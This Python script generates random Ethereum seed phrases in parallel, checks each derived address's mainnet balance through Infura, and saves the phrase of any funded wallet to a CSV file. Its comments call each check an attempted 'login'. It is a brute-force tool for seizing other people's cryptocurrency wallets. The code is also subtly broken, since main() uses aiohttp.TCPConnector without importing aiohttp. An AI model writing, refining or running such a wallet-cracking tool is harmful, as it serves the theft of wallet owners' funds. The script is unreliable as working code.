import os
import logging
import asyncio
from web3 import Web3
from mnemonic import Mnemonic
from eth_account import Account
from dotenv import load_dotenv
from aiohttp import ClientSession, ClientTimeout
import csv

# Load environment variables
load_dotenv()

# Enable HD wallet features
Account.enable_unaudited_hdwallet_features()

# Set up logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("app.log"),
        logging.StreamHandler()
    ]
)

# Constants
INFURA_PROJECT_ID = os.getenv('INFURA_PROJECT_ID', 'your_actual_project_id')
INFURA_URL = f'https://mainnet.infura.io/v3/{INFURA_PROJECT_ID}'
RETRY_DELAY = int(os.getenv('RETRY_DELAY', '2'))
MAX_CONCURRENT_TASKS = min(int(os.getenv('MAX_CONCURRENT_TASKS', str(os.cpu_count() * 2))), 50)
MNEMONIC_STRENGTH = int(os.getenv('MNEMONIC_STRENGTH', '128'))

# Connect to Ethereum network
w3 = Web3(Web3.HTTPProvider(INFURA_URL))
if not w3.is_connected():
    logging.error("Failed to connect to Ethereum network.")
    raise SystemExit("Cannot connect to Ethereum network")

# Function to generate a mnemonic phrase
def generate_mnemonic(strength=MNEMONIC_STRENGTH):
    mnemo = Mnemonic("english")
    return mnemo.generate(strength=strength)

# Function to create an Ethereum account from a mnemonic
def mnemonic_to_private_key(mnemonic):
    try:
        account = Account.from_mnemonic(mnemonic)
        return account
    except Exception as e:
        logging.error(f"Error creating account from mnemonic: {e}")
        return None

# Asynchronous function to check account balance
async def check_account_balance(session, address):
    url = INFURA_URL
    payload = {
        'jsonrpc': '2.0',
        'method': 'eth_getBalance',
        'params': [address, 'latest'],
        'id': 1
    }
    timeout = ClientTimeout(total=10)
    try:
        async with session.post(url, json=payload, timeout=timeout) as response:
            if response.status != 200:
                logging.error(f"HTTP error: {response.status}")
                return False

            data = await response.json()
            logging.debug(f"Response data: {data}")
            balance = int(data['result'], 16)
            return balance > 0
    except Exception as e:
        logging.error(f"Error checking balance for {address}: {e}")
        return False

# Save successful mnemonics and addresses to a file
def save_successful_mnemonic(mnemonic, address):
    with open('successful_mnemonics.csv', mode='a') as file:
        writer = csv.writer(file)
        writer.writerow([mnemonic, address])

# Worker function to generate mnemonic and attempt login
async def try_login(session, semaphore):
    while True:
        mnemonic = generate_mnemonic()
        account = mnemonic_to_private_key(mnemonic)
        if account is None:
            logging.error("Failed to create account from mnemonic.")
            await asyncio.sleep(RETRY_DELAY)
            continue

        logging.info(f"Trying account: {account.address}")

        async with semaphore:
            if await check_account_balance(session, account.address):
                logging.info(f"Successfully logged in with mnemonic: {mnemonic}")
                save_successful_mnemonic(mnemonic, account.address)
                return mnemonic  # Return the successful mnemonic

        logging.info("Login failed, generating a new mnemonic...")
        await asyncio.sleep(RETRY_DELAY)

# Main function to manage parallel workers
async def main():
    semaphore = asyncio.Semaphore(10)  # Adjust based on rate limit
    connector = aiohttp.TCPConnector(limit=50)

    async with ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(try_login(session, semaphore)) for _ in range(MAX_CONCURRENT_TASKS)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, str):
                logging.info(f"Successful mnemonic found: {result}")
                return

        logging.info("No successful mnemonic found.")

if __name__ == "__main__":
    asyncio.run(main())
